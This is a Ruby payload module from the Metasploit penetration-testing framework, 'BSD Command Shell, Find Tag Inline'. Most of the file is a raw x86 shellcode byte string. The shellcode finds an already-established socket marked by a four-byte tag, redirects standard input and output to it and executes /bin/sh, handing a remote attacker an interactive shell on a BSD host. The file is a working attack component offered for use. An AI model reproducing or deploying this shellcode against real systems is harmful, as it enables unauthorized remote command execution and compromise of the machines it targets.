##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/find_tag'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::Bsd
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'BSD Command Shell, Find Tag Inline',
      'Description'   => 'Spawn a shell on an established connection (proxy/nat safe)',
      'Author'        => 'skape',
      'License'       => MSF_LICENSE,
      'Platform'      => 'bsd',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::FindTag,
      'Session'       => Msf::Sessions::CommandShellUnix,
      'Payload'       =>
        {
          'Offsets' =>
            {
              'TAG' => [ 0x1b, 'RAW' ],
            },
          'Payload' =>
            "\x31\xd2\x52\x89\xe6\x52\x52\xb2\x80\x52\xb6\x0c\x52\x56\x52\x52" +
            "\x66\xff\x46\xe8\x6a\x1d\x58\xcd\x80\x81\x3e\x6d\x73\x66\x21\x75" +
            "\xef\x5a\x5f\x6a\x02\x59\x6a\x5a\x58\x51\x57\x51\xcd\x80\x49\x79" +
            "\xf5\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54" +
            "\x53\x53\xb0\x3b\xcd\x80"
        }
      ))
  end

  #
  # Ensures the setting of TAG to a four byte value
  #
  def generate
    datastore['TAG'] = _find_tag

    super
  end

end
